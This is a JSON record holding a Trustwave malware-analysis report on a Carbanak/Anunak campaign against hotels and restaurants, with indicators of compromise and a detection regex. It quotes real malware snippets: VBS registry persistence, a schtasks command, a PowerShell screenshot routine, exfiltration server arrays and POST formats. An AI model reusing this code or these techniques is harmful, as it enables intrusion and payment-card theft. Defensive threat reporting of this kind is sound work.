{
    "id": "5f36cab1-65cc-4f9d-8923-6f9cf286ca39",
    "created_at": "2022-10-25T16:48:19.042523Z",
    "updated_at": "2025-03-27T02:16:57.972268Z",
    "deleted_at": null,
    "sha1_hash": "35f1522128ae21490cc812f5929b961fe0cbdf5c",
    "title": "New Carbanak / Anunak Attack Methodology",
    "authors": "Trustwave",
    "file_creation_date": "2016-12-31T06:04:13Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 1399058,
    "plain_text": "**[www.trustwave.com /Resources/SpiderLabs-Blog/New-Carbanak-/-Anunak-Attack-Methodology/](https://www.trustwave.com/Resources/SpiderLabs-Blog/New-Carbanak-/-Anunak-Attack-Methodology/)**\n\nPosted By Brian Hussey\n\nIn the last month Trustwave was engaged by two separate hospitality clients, and one restaurant chain for investigations by an unknown attacker\nor attackers. The modus operandi for all three investigations were very similar and appear to be a new Carbanak gang attack methodology,\nfocused on the hospitality industry. Carbanak is a prolific crime group, well known for stealing over one billion dollars from banks in 2015\n_(*Kaspersky estimated loss) and more recently orchestrating an attack on the Oracle Micros POS support site that put over one million Point of_\nSale systems at risk. The current investigations are still underway but the known indicators of compromise in these new attacks will be\npresented below. At the time of investigation this malware was not correctly detected by any existing antivirus engines, and domains / IP's were\nnot found in any commercial threat intelligence feeds.\n\nIt is also interesting to note that just during the time that it took to write this blog, Carbanak returned to their victims with significantly upgraded\nmalware. This demonstrates the speed and versatility of this threat group. We have included analysis for two separate versions of\nAdobeUpdateManagementTool.vbs in this report. (The malware used following the initial infection) Version two arrived only two weeks after we\nbegan investigating this new campaign.\n\n**Attack Vector**\n\nThe attacks began via social engineering. An attacker called the customer contact line saying that they were unable to use the online reservation\nsystem and requested to send their information to the agent via email. The attacker stayed on the line until the agent opened the attachment\ncontained in the email and hung up when his attack was confirmed successful. The email attachment was a malicious Word Document that\ncontained an encoded .VBS script capable of stealing system information, desktop screenshots, and to download additional malware.\n\nA screenshot of the malicious Word document is shown below. The malicious VB Script will use macros to search for instances of Microsoft\nWord running on the system, if found, it will clear the existing text and replace it with the following text.\n\nThe victim system will then reach out to http://95.215.47.105 to retrieve additional malware called AdobeUpdateManagementTool.vbs.\n\n**AdobeUpdateManagementTool.vbs - Indicators of compromise:**\n\nFile name: adobeupdatemanagementtool.vbs\n\nSHA-1 8d7c90a699b4055e9c7db4571588c765c1cf2358 (Version 1)\nSHA-1 a91416185d2565ce991fc2c0dd9591c71fd1f627 (Version 2)\n\nCreates folder: %temp%\\WindowsUpdate\n\nCreates folder: %temp%\\WindowsUpdate_\\Dropebox\n\nAdds file to WindowsUpdate folder: vbs\n\nAdds persistence mechanism to the CURRENT_USER registry hive in the CurrentVersion\\Run and CurrentVersion\\RunOnce keys to\nautostart AdobeUpdateManagementTool.\n\nA scheduled task is created named SysChecks which calls the vbs\n\nA service is created named 'ADOBEUPDTOOL' which calls the AdobeUpdateManagementTool.vbs\n\nThe malware drops a Shockwave Flash icon and disguises itself as such.\n\n\n-----\n\nThe malware contacts the following and may attempt to download doc:\n\nhttp://revital-travel.com/cssSiteteTemplates\n\nhttp://juste-travel.com/cssSiteteTemplates\n\nhttp://park-travels.com\n\n_All domains resolve to the same IP address (192.99.14.211)_\n\nhttp://95.215.46.249\n\n179.43.133.34\n\nThe malware may report to the following command and Control Servers, depending on the version used in the attack:\n\nhttp://148.251.18.75\n\nhttp://95.215.46.221\n\nhttp://95.215.46.229\n\nhttp://95.215.46.234\n\nhttp://81.17.28.124\n\nThis malware was capable of stealing significant system and network information. It was also used to download several other reconnaissance\ntools to map out the network. Downloaded tools have included Nmap, FreeRDP, NCat, NPing, and others. Two files of significance, el32.exe and\n**_el64.exe, are privilege escalation exploits for 32 and 64 bit architectures. Their hashes are as follows:_**\n\nel32.exe SHA1: 83D0964F06E5F53D882F759E4933A6511730E07B\n\nel64.exe SHA1: CF5B30E6ADA0D6EE7449D6BDE9986A35DF6F2986\n\nThis malware was primarily responsible for the reconnaissance stage of the attack. However, it also downloaded additional malware that enables\nthe next stage of the attack and could execute powershell scripts on command.\n\n**Beaconing - AdobeUpdateManagementTool.vbs**\n\nWe have seen slightly different data beaconing methodologies over the different attacks, but the general approach has remained the same.\nBeaconing messages are sent out to 179.43.133.34 via standard HTTP GET requests every 5 minutes. Using this simple methodology allows\nthe beaconing to hide very well within standard corporate network traffic. The content of the GET request is encoded with Base64 and\nsecondarily encrypted with RC4. Trustwave has written a specialized decoder for this traffic and it can be obtained upon request.\n\nThe innocuous nature of this traffic allows it to be stealthy in a corporate network, however, its uniformity of structure also allows analysts to\nidentify it relatively quickly as well. Security staff can identify beaconing traffic using the following technique.\n\nThe network packet times of the GET requests originating from a compromised host occur almost exactly every 300 seconds (5 minutes). No\nweb content is ever returned from the GET request except for code 200 OK, as shown below. (**Please note that the name=value pairs have\n_been snipped for confidentiality reasons):_\n\n**GET /{random_param_name}.jsp?qqksq=MTgzLTIyIDhBIDkwI …**\n**IDNFIDYwIDZCIDU4IEJFIDZCIENFIDY3&kfb4mz=MTgzLTIyIDhBIDkwIEV … IDBGIDUyIDZDIDhF&xzn8=MTgzLTIyIDhBIDkwIEVGID**\n**… DUyIDZDIDhF HTTP/1.1**\n**Connection: Keep-Alive**\n**Keep-Alive: 300**\n**Content-Type: application/x-www-form-urlencoded**\n**Accept: */***\n**User-Agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML,**\n**like Gecko) Version/4.0 Mobile Safari/533.1**\n**Charset: utf-8**\n**Host: 179.43.133.34**\n\n\n-----\n\n**Server: Apache/2.2.22 (Debian)**\n**X-Powered-By: PHP/5.4.45-0+deb7u2**\n**Vary: Accept-Encoding**\n**Content-Length: 0**\n**Keep-Alive: timeout=5, max=100**\n**Connection: Keep-Alive**\n**Content-Type: text/html**\n\nThe purpose of the GET request, with nothing coming back except the 200 code, is to \"phone home\" so the attacker knows the compromised\nsystem is available for further exploitation. To locate these specific GET requests you can use the following regular expression as an initial filter:\n\n**grep -E \"GET /[a-z]{1,4}[a-z0-9]{1,6}\\.jsp\\?\" log.txt**\n\nFull analysis of this malware can be found later in this report.\n\n**Second Stage – Carbanak / Anunak Malware:**\n\nFilename: bf.exe\nSHA1: 3d00602c98776e2ea5d64a78fc622c4ff08708e3\n\nThis malware executes a new iteration of svchost.exe and injects its malicious code into this running process. This hides the malware within the\nsvchost.exe process. (*Warning- our analysis has shown that some antivirus firms incorrectly identify this file as ransomware.)\n\nIt then drops a pseudo-randomly named configuration file into the %ProgramData%\\Mozilla folder. This file's name is base64 encoded and\nbased on the infected system's MAC code, so identifying it by name will be challenging. However, it does always have a .bin extension. Any\nrecent file in this folder with a .bin extension may be suspect.\n\nIt then searches Kaspersky antivirus processes and terminates them if running on the victim system.\n\nFor persistency, it registers itself as a service with the following details:\n\nService name: RpcSsSys (this name is random, may vary on different system)\nPath: \"C:\\Documents and Settings\\All Users\\Application Data\\Mozilla\\svchost.exe\"\nDisplay name: Emote Procedure Call (RPC)\n\nIt then proceeds to download kldconfig.exe, kldconfig.plug, and runmem.wi.exe. These tools are all well-known Carbanak malware and\nvariations of them were used in the banking intrusions that made them famous in 2015. Additionally, the decrypted string references\n\"anunak_config\" which is the encrypted configuration file that it downloads from its control server. The Anunak crime group is generally\nbelieved to be synonymous with Carbanak.\n\nThis malware is very multi-functional as it can enable remote desktop, steal local passwords, search user's email, target IFOBS banking systems\n(which Carbanak used so effectively in recent banking attacks), or install completely different remote desktop programs, such as VNC or\nAMMYY. Full details on this malware's functionality is included later in this report.\n\nFinally, this malware, like so many others, is designed to target credit card data by scraping memory on Point-of-Sale systems. This leaves little\n\n\n-----\n\n**Exfiltration – bf.exe**\n\nThis malware provides the attacker remote command and control of the victim system via a multifunctional backdoor capability. It communicates\nvia an encrypted tunnel on port 443 with the following IP addresses:\n\n5.45.179.173\n\n92.215.45.94\n\nThese are also the destinations that stolen data will be exfiltrated to. This malware may steal credit card data, as well as screen captures,\nkeylogger information, email addresses from the PST file, enable RDP or VNC sessions, or to obtain additional system information.\n\nAll exfiltrated information is encrypted with base64+RC2 and sent via HTTP POST messages.\n\nIf you identify any of these IoC's on your network, you should contact a Trustwave account representative immediately, or reach out directly to\nthe Trustwave SpiderLabs IR team at our 24-hour hotline:\n\n**24hr Hotline +1 (866) 659-9097 Option 5**\n**International: +1 (312) 873-7500, Option 4**\n\n## Detailed Analysis of Carbanak Malware: Malicious Word Document Attachment / Adobeupdatetool.Vbs (Version 1)\n\n**Summary**\n\nThe file is OLE compound file format that contains an embedded .VBE (encoded VBS) script. The dropped script is capable of stealing system\ninformation, desktop screenshots and to download / execute additional malware.\n\n**Analysis**\n\nThe encoded VBScript is embedded in OLE compound file.\n\n\n-----\n\n**The Loader VBScript**\n\nThe dropped VBE file is a loader script that drops, installs and executes a second layer VBScript payload in the victim's system.\n\nIt creates a folder named \"WindowsUpdate_\" in the Window's %temp% directory, If the folder already exists, it will create the folder in the\nparent directory where the script resides.\n\n**SSCripTdir=sh.ExpanDEnvirOnmentStrings(\"%TMP%\")+\"\\WindowsUpdate_\" IF not fso.FoldErEXIstS(sScriptdiR)Then**\n**fso.CReatefOlder SScriptDir End IF Err.Clear If NoT fso.FolderExiSTs(SSCriptDir)THen**\n**sScriptDir=fso.GetParentFolderName(Wscript.ScriptFulLName)+\"\\WindowsUpdate_\" If NoT**\n**fso.FOlderExiSts(SScriptDir)THen fso.CReAteFolder sscriptDir**\n\nA registry key is created that points to the Loader's directory\n\n**sh.RegWriTe\"HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Network\\LdrPath\",sScriPtdIr,\"REG_SZ\"**\n\nThe second VBScript payload is embedded in the loader script as a Base64 string:\n\nThe loader script decodes the base64 string. This is then saved to a file named \"AdobeUpdateManagementTool.vbs\" into the\n**\"\\WindowsUpdate_\" folder.**\n\n**Dim run_Pth_scR run_pth_scr=ldrpath+\"\\AdobeUpdateManagementTool.vbs\" dim RUn_Pth**\n\nA persistence registry key is also created by the loader script:\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobeUpdateManagementTool\n\n**On ErrOr Resume NExt**\n**sh.RegWrIte\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobeUpdateManagementTool\",run_p**\n**ErR_NUmBer=err.number If Err_nuMber<>0 Then cerr1.ErrAdd\"Error #I-9\",0 Err.ClEar End If On Error Resume nex**\n**sh.RegWrite\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\AdobeUpdateManagementTool\",**\n**Err_Number=eRr.number**\n\nThe loader script adds a scheduled task with a task named \"SysChecks\". The purpose of this scheduled task is to run the payload script\n(AdobeUpdateManagementTool.vbs) in every 5 minutes\n\n**sh.Run\"schtasks /create /tn \"\"SysChecks\"\" /tr \"\"\"&run_pth&\"\"\" /sc minute /mo 5\",0,falSe**\n\nA SWF icon file is also dropped in the folder in order to disguise the dropped file as a Shockwave Flash file:\n\nA shortcut file is also added in the Windows startup folder as \"AdobeUpdateManagementTool.lnk\"\n\n**Set LinKSTart=sh.CreateShoRTcuT(SPath&\"\\AdobeUpdateManagementTool.lnk\") With LinksTart**\n**LinksTart.ArGuMeNts=ruN_pth_scr .dEsCription=\"AdobeUpdateManagementTool\" .HoTKeY=\"CTRL+X\"**\n**.IconLocation=ico_Filename .TargEtPath=wscRipt_pThPaTH .WiNdoWStyle=7**\n**.WorkinGdirectory=sh.ExpandEnvironmEntStrings(\"%windir%\\System32\") .SaVe**\n\n**The Payload Script**\n\nThe payload script is dropped in the \"%temp%\\WindowsUpdate_\" as \"AdobeUpdateManagementTool.vbs\". The script uses obfuscation, a\ncombination of base64 and integer-ed characters (chr) to hide malicious code.\n\n\n-----\n\n**chr(50 + 51) & chr(-67 + 168) & chr(53 + 59) & \"\")**\n\nThe payload script checks if the following folder exists otherwise it creates it: %AllUsersProfile% + \"\\Dropebox\" + (for example in Windows 7\nsystem: C:\\ProgramData\\DropeboxJoePC). This is where it stores additional script files and stolen data:\n\n**dim EZ0uaqbfk9m: EZ0uaqbfk9m = EY4hrd8cuo.ExpandEnvironmentStrings(\"%USERNAME%\") EZ0uaqbfk9m = DT6zmqx4fb(**\n**EZ0uaqbfk9m ) FA1pcr7i8c3z = ldrpath +\" \\Dropebox\" + EZ0uaqbfk9m**\n\nThe payload has the following functionality:\n\n**Steal system information**\n\nSystem Name\n\nSystem Manufacturer\n\nSystem Model\n\nTime Zone\n\nTotal Physical Memory\n\nProcessor System Type\n\nProcessor\n\nBIOS Version\n\nNetworking information\n\nComputer name\n\nDomain\n\nUser name\n\n**Desktop screenshot**\n\nA powershell script (filename: screenshot__.ps1) is created to screenshot victim's desktop.\n\n**#Desktop screenshot routine, dropped as a powershell $ErrorActionPreference=\"stop\"; try{**\n\n**[Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\") function**\n**screenshot([Drawing.Rectangle]$bounds, $path){ $bmp = New-Object Drawing.Bitmap $bounds.width,**\n**$bounds.height $graphics = [Drawing.Graphics]::FromImage($bmp) $graphics.CopyFromScreen($bounds.Location,**\n\n**[Drawing.Point]::Empty, $bounds.size) $bmp.Save($path) $graphics.Dispose() $bmp.Dispose() } $ScriptDir =**\n**Split-Path $script:MyInvocation.MyCommand.Path $pth = $ScriptDir + \"\\screenshot__.png\" $bounds =**\n\n**[Drawing.Rectangle]::FromLTRB(0, 0, 1500, 1000) screenshot $bounds $pth; }catch{}**\n\n**Downloaded malicious executable**\n\nIt may also be able to receive additional malware executables and install them on the victim's computer.\n\n**Terminate Processes**\n\nThe payload is also capable of terminating processes.\n\n**Network**\n\nThe malware sends stolen data to the following URI:\n\n**urlArry(0) = \"http://95.215.46.249\" urlArry(1) = \"http://revital-travel.com/cssSiteteTemplates\" urlArry(2)**\n**= \"http://juste-travel.com/cssSiteteTemplates\"**\n\nThe data is sent as a data encrypted with RC4 and Base64 It is sent via an HTTP POST tunnel to the attacker's server.\n\n**POST /{random_param_name}.jsp?**\n**xz2q=MjgtQUIgMTEgRDYgMEYgMTggNTYgNEUgRDQgODYgQTEgNUQgOTAgRDEgQjAgM0UgNEIgRkEgMDIgRTQgOEUgOUIgNUUgNEEgMTYgMT**\n**HTTP/1.1 Connection: Keep-Alive Keep-Alive: 300 Content-Type: multipart/form-data; boundary=\"eb3d0b5d91fbde**\n\n## Detailed Analysis of Carbanak Malware: Malicious Word Document Attachment / Adobeupdatetool.Vbs (Version 2)\n\n\n-----\n\nes a ed da a s se o e a ac e s add esses oug a OS u e\n\n**Analysis**\n\nUpon execution AdobeUpdateManagementTool.vbs will query the process in the infected system if it is already running, if an existing instance of\nthe script is already running, it will quit, otherwise it will proceed.\n\nIt then attempts to read the following registry key:\n\n**HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Network\\CC - Computer Count**\n\nThe script then generates a unique identifier, using the following format:\n\n**%md_id% - %l_ver% - %ptrtr% - %compCount%where:**\n**%md_id% - XORed Computer name and MAC Address.**\n**%l_ver% - hard coded in the malware script e.g. Dim HH5hjs54j69a: HH5hjs54j69a = \"1\"**\n**%ptrtr% - hard coded in the malware script e.g Dim HI0cvexizqw: HI0cvexizqw = \"2\"**\n**%compCount% - value from the registry key: HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Network\\CC,**\n**default value is the string \"NO\"**\n\nThe malicious script checks if the following folder exists otherwise it creates it:\n\n**%AllUsersProfile% + \"\\Dropebox\" + <username>**\n**for example in Windows 7 system**\n**C:\\ProgramData\\DropeboxJoePC**\n\nThe following files will be dropped under this Folder, these files are only created if required by the command sent by the attacker:\n\n1. screenshot__.ps1 - a powershell script that takes screenshots of the active desktop\n\n2. screenshot__.png - the screenshot image\n\n3. exe__.exe - an executable file sent by the attacker\n\n4. vb__.vbs - a VBscript sent by the attacker\n\n5. ps1__.ps1 - a Powershell script sent by the attacker\n\n6. insatller.vbs - updater script sent by the attacker\n\nEvery time this script is executed, it requests commands from the Attacker's control server using HTTP GET request.\n\n**GET /{random_param_name}.jsp?pId==={unique ID %md_id%}<<$>>{MD5 hash of the current Date & Time} <- this**\n**is encrypted in RC4 with hardcoded key and Base64. The GET parameters may also be iterated up to 3 times.**\n**User-agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML,**\n**like Gecko) Version/4.0 Mobile Safari/533.1 Charset:utf-8 Connection: Keep-Alive Keep-Alive:300 Content-**\n**Type: application/x-www-form-urlencoded**\n\nThe script receives three types of information from the GET request:\n\nid = the unique ID of the infected system (%md_id%)\n\ncmd = MD5 hash of the attacker's command\n\ncmduniq = contains a value that signifies that this command is unique\n\nThe commands sent by the attackers are in MD5 hash, this is a anti-analysis technique. Here are the command hashes that the attacker may\nsend:\n\n|COMMAND|HASH (MD5)|DESCRIPTION|\n|---|---|---|\n|info|caf9b6b99962bf5c2264824231d7a40c|Retrieves system information. See below for the detailed information and exfiltration method.|\n|proc|6844acdce7e192c21c184914d73ab6be|Retrieves all running process.|\n|scrin|e3b523c3cf36e1e0f64fec6ac6ac3ff7|Takes screenshot of desktop. This command drops and executes the file screenshot__ps1 and the image is saved to screenshot__.png. The image is then sent to the control server IP address via an HTTP POST tunnel|\n\n\n-----\n\n|exe|98e83379d45538379c2ac4e47c3be81d|The attacker sends this command with an accompanying executable file that is saved to a file called exe__.exe. This is then executed and after 10 seconds this file will be deleted.|\n|---|---|---|\n|vbs|b3720bcc7c681c1356f77ba9761fc022|The attacker sends this command with an accompanying VBScript that is saved as vb__.vbs. The script is executed and the result returned by the script is saved to a temporary file in the Windows %temp% folder. The results are sent to the control server through an HTTP POST tunnel (see exfiltration detail below). Both resulting files are deleted after the execution. Note: the results are encoded in Base64 with the following text format: type: vbs time: {currrent time} result: {result details}|\n|update|3ac340832f29c11538fbe2d6f75e8bcc|This command receives an accompanying VBScript updater. This script is saved to insatller.vbs and then executed, it then uninstalls its old version. The file is deleted 10 seconds after execution.|\n|ps1|9ffb800e76372160cbb02415dccd7dec|the attacker sends this command with an accompanying Powershell script that is saved to ps1__.ps. The script is executed and the result is returned by the script and is saved to a temporary file in the Windows %temp% folder. The result is sent to the control server through HTTP POST tunnel (see exfiltration detail below). Both files are deleted after the execution. Note: the results are encoded in Base64 with the following text format: type: ps1 time: {currrent time} result: {result details}|\n|dll|06416233fe5ec4c5933122e4ab248af1|This command did not function in this version of the malware.|\n|delete|099af53f601532dbd31e0ea99ffdeb64|Removes the service running this script by running this command \"cmd.exe /c \"\"sc delete %ADOBEUPDTOOL%\". (This Service was installed by the dropper of this script.). It then deletes this script.|\n|scrrunr|cbd22ed4f5cd88afcfeae0cfc80ed482|Not actually a command, but somewhat an indicator that will be sent to the control server each time a script is executed.|\n\n\nThe malware checks for the following registry key if the command has the same cmduniq value. If it is the same, it terminates the script,\notherwise it writes the cmdunig value to this registry key:\n\n**HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\c_last**\n\nFollowing is the System information sent to the control server when the command \"INFO\" is received from the attacker.\n\nOS Name\n\nVersion\n\nService Pack\n\nOS Manufacturer\n\nWindows Directory\n\nLocale\n\nAvailable Physical Memory\n\nTotal Virtual Memory\n\nAvailable Virtual Memory\n\nSystem Name\n\nSystem Manufacturer\n\nSystem Model\n\nTime Zone\n\n\n-----\n\nProcessor System Type\n\nProcessor\n\nBIOS Version\n\nComputer name\n\nDomain\n\nUser name\n\nThis system information is also stored in this registry key:\n\n**HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Network\\CLM**\n\nThe result data is exfiltrated after each attackers command is executed. This is sent as a HTTP POST request to the control server.\n\n**POST /{random_name}.jsp?pId==={unique ID %md_id%}<<$>>{MD5 hash of Date & Time Now} <- this is encrypted**\n**in RC4 with hardcoded key and Base64. The POST parameters may also be iterated up to 3 times. User-agent:**\n**Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko)**\n**Version/4.0 Mobile Safari/533.1 Charset:utf-8 Connection: Keep-Alive Keep-Alive:300 Content-Type:**\n**\"multipart/form-data; boundary=\"{Random MD5 hash}\"**\n\nThe HTTP POST uses the body format below:\n\n**--{random MD5 hash}**\n**Content-Disposition: form-data; name=\"{random name}\"**\n**{unique ID and current Date/Time Hash - encrypted with RC4 and Base64}**\n**--{random MD5 hash}**\n**Content-Disposition: form-data; name=\"{random name}\"**\n**pPar1c==={unique ID encrypted with RC4 and Base64}**\n**--{random MD5 hash}**\n**Content-Disposition: form-data; name=\"{random name}\"**\n**pPar2c==={command's MD5 Hash encypted with RC4 and Base64}**\n**--{random MD5 hash}**\n**Content-Disposition: form-data; name=\"{random name}\"**\n**pPar3c==={Results/Data/StolenInformation encypted with RC4 and Base64}**\n\nAfter executing the command and exfiltrating the data, the malware sleeps for 3- 5 minutes (depending on the configuration hard-coded in the\nscript) then loops to request the command again.\n\n**Network**\n\nCommand and Control Servers:\n\nhttp://148.251.18.75\n\nhttp://95.215.46.221\n\nhttp://95.215.46.229\n\nhttp://95.215.46.234\n\nhttp://81.17.28.124\n\n## Detailed Analysis of Carbanak Malware: bf.exe\n\n**File Info**\n\n**Filename: bf.exe**\n\n**Size: 267216**\n\n**Filetype: PE32 executable (GUI) Intel 80386, for MS Windows**\n\n**Compile Date: 2016-03-01 08:50:54**\n\n**Sha1 Hash: 3d00602c98776e2ea5d64a78fc622c4ff08708e3**\n\n**MD5 Hash: c7b224d95fc96094afd2678cae753dcb**\n\n**Summary**\n\n\n-----\n\ne ecu g add o a a a e\n\n**Analysis:**\n\n**Malware Installation**\n\nThis malware unpacks its main executable in memory and executes it.\n\nIt then drops a config file in the %appdata%\\Mozilla folder as well as copy of itself with the filename \"svchost.exe\". The config filename is a\nbase64 string comprising of a unique string and the MAC address of the infected system.\n\nFor example V14UDFcJZ1FfXQIIVA== to V14UDFcJZ1FfXQIIVA.bin.\n\nIt then spawns a new svchost.exe process with the command: \"C:\\WINDOWS\\system32\\svchost.exe -k netsvcs\" and then injects its code to that\nprocess. After process injection, the main malware executable terminates.\n\nIn this example the Mutex named \"V14UDFcJZ1FfXQIIVA\" is then created.\n\nFor persistency, it registers itself as a service with the following details:\n\n**Service name: RpcSsSys (this name is random, may vary on different systems)**\n**Path: \"C:\\Documents and Settings\\All Users\\Application Data\\Mozilla\\svchost.exe\"**\n**Display name: Emote Procedure Call (RPC)**\n\n**Anti-reversing**\n\nThe malware checks for the \"isDebugged\" flag in the PEB (Process Environment Block). It also checks for significant delay of code execution by\nutilizing the GetTickCount() function. Delay in code execution means the process is being debugged.\n\nStrings are heavily obfuscated to avoid static string analysis. The malware has a decoder table loaded in memory that is used for its lookup\nalgorithm. All strings are deobfuscated on-the-fly.\n\n**decodertable = \"\\x00\\x12\\x1C\\x13\\x0A\\x0D\\x14\\x07\\x15\\x0C\\x16\\x09\\x05\\x03\\x17\\x1D\\x1A\\x10\\x1F**\n**\\x0E\\x08\\x06\\x11\\x04\\x1E\\x19\\x0B\\x1B\\x01\\x02\\x0F\\x18\\x20\\x21\\x42\\x5E\\x24\\x25\\x26\\x4A\\x28\\x29\\x6A\\x6B**\n**\\x2C\\x2D\\x53\\x22\\x30\\x31\\x7F\\x4E\\x34\\x35\\x4B\\x5A\\x38\\x39\\x7A\\x7B\\x3C\\x3D\\x43\\x5F\\x40\\x41\\x62\\x63\\x44**\n**\\x45\\x46\\x27\\x48\\x49\\x47\\x2B\\x4C\\x4D\\x73\\x4F\\x50\\x51\\x52\\x2E\\x54\\x55\\x56\\x57\\x58\\x59\\x3A\\x5B\\x5C\\x5D**\n**\\x7E\\x72\\x60\\x61\\x2F\\x23\\x64\\x65\\x66\\x2A\\x68\\x69\\x67\\x36\\x6C\\x6D\\x33\\x6F\\x70\\x71\\x3F\\x6E\\x74\\x75\\x76**\n**\\x77\\x78\\x79\\x37\\x3B\\x7C\\x7D\\x3E\\x32\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"**\n\nA sample code snippet of the Decoder:\n\nAn API Hashing technique is also utilized by the malware in order to hide relevant API functions it uses in its code. Rather than storing imported\nAPI names in the body, the malware author has pre-calculated the CRC hash of the API function. On runtime, all the malware does is to look-up\nthe equivalent API name from its generated hash table.\n\n**Antivirus retaliation**\n\nSpecific Kaspersky antivirus processes are terminated:\n\navp.exe\n\navpui.exe\n\n\n-----\n\nThe malware checks the system OS:\n\nWindows 8.1\n\nWindows 8\n\nWindows 7 SP1\n\nWindows Vista SP2\n\nWindows RT 8.1\n\nWindows RT\n\nWindows XP SP1\n\nWindows XP SP2\n\nWindows XP SP3\n\nWindows Server 2012\n\nWindows Server 2012 R2\n\nWindows Server 2008 SP2\n\nWindows Server 2008 R2 SP1\n\nWindows Server 2003 SP2\n\nIf found, it attempts to exploit a vulnerability in \"win32k.sys\" identified as CVE-2013-3660 to escalate the privilege of the malware process.\n\n**Obtaining the Proxy Settings**\n\nThe malware gets the proxy setting from the Internet Explorer registry key:\n\n**HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer**\n\nIt also gets the proxy setting stored in Mozilla's prefs.js file.\n\nThe attacker however can push its own custom proxy settings to the malware.\n\n**Enabling Remote Desktop**\n\nThe malware enables the Remote Desktop by starting the Termservice service. It also sets the service to auto-mode so that the service will start\non Windows startup.\n\nIt also enables the following Terminal Server registry key:\n\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\n\nfDenyTSConnection\n\n\n-----\n\nAllowMultipleTSSession\n\n**POS Malware**\n\nBefore the main POS routine, the malware searches data from the log file named \"nsb.pos.client.log\" and C:\\NSB\\Coalition\\Log\n\nIt then enumerates the processes listed in a config file (klgconfig.plug) pulled from the control server. From here it scrapes the process memory\nheap for credit card data, specifically the Track 1. After collecting the card data, it creates a file where it stores the information.\n\nThis is the code snippet where it saves the data to an XML file:\n\n**Outlook Items**\n\nThe malware also targets victim's email data by scrounging the victim's Outlook PST files for contact's email addresses, possibly to be used for\nfurther spear-phishing attacks from known individuals.\n\n**Local Password Stealer**\n\nThe malware utilizes the open source project called Mimikatz and reused codes from this project to steal clear text local passwords from Lsass\nmemory dump.\n\n**Plugins**\n\n1. **ifobs.pl- the malware reused code from the Carperp ifobs module to target a banking application called iFOBS. This is a very popular**\n\nbanking platform in Russia and Eastern Europe and this malware can be used to compromise IFOBS banking systems. When using this\nmodule, the malware hooks the following libraries:\n\n\n-----\n\n**\"vcl70.bpl\", \"HProc5\", 0x3DF02899, \"TCustomFormCloseQuery\" }, { \"RtlStore.bpl\", \"HProc6\", 0xCF6CD66,**\n**\"GlobalAppStorage\" }, { \"RtlData1.bpl\", \"HProc7\", 0xAFD2F1E2, \"FillDataToDBCache\" },**\n\n2. **ammyy.pl- this enables the malware to run AMMYY remote desktop control software**\n\n3. **vnc.pl- this enables the malware to run a remote desktop VNC application**\n\n**Backdoor Commands**\n\nThe attacker can also send backdoor commands. In the malware code, a command hash table is used to compare commands (in readable\nstrings) sent by the attacker, the hash of this command string is calculated by the malware. If the hash of the string matches any hash in the\ntable, it executes the corresponding action.\n\nThe image below is the command and it's corresponding hash (in green font)\n\n**Network**\n\nIt connects to a hardcoded IP address: 5.45.179.173 or 95.215.45.94 through an encrypted tunnel at port 443.\n\n**Compiler/Artifacts**\n\nThe following sections describe artifacts found in the file\n\n**Malware Version Info**\n\nlegalcopyright: Blattering\n\ninternalname: Soulfulness\n\nM idi h L d\n\n\n-----\n\nfiledescription: Sanger\n\noriginalfilename: Adoptable Nightjars\n\n## Conclusion\n\nIn many ways, this attack follows a very common series of events:\n\n1. Social engineering / phishing used to gain initial network foothold\n\n2. Cleverly disguised malware establishes remote control of victim system and downloads additional tools\n\n3. Attacker conducts reconnaissance to scan network, expand foothold, and identify high-value targets\n\n4. Payment card information and/or PII (personally identifiable information) is captured and exfiltated back to the attacker.\n\nHowever, the persistence, professionalism, and pervasiveness of this campaign is at a level rarely seen by Trustwave. The malware used is very\nmultifaceted and still not caught by most (if any) antivirus engines. The social engineering is highly targeted, conducted via direct phone calls by\nthreat actors with excellent English skills. The network reconnaissance and lateral movement is rapid and highly effective. Finally, the data\nexfiltration methodology is stealthy and efficient.\n\nCarbanak is one of the most sophisticated threat actors in the cybercrime realm today and this report details a very active campaign currently\nbeing leveraged against hospitality and restaurant industries (and probably others). We encourage everyone to search their network for the\nIOC's described in this report and to contact Trustwave immediately if any are found.\n\n[https://www.trustwave.com/Company/Contact/](https://www.trustwave.com/Company/Contact/)\n\n_**Credits for the analysis and creation of this cyber threat announcement: Rodel Mendrez, Reno Zenere, James Antonakos, Brian Hussey_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/cbclbgiu54ihivxe7bvblwsv1e8jq44h"
    ],
    "report_names": [
        "Trustwave_Carbanak _Anunak_Attack_Methodology(11-14-2016)"
    ],
    "threat_actors": [
        {
            "id": "c9617bb6-45c8-495e-9759-2177e61a8e91",
            "created_at": "2022-10-25T15:50:23.405039Z",
            "updated_at": "2025-03-27T02:00:55.462193Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Carbanak",
                "Anunak"
            ],
            "source_name": "MITRE:Carbanak",
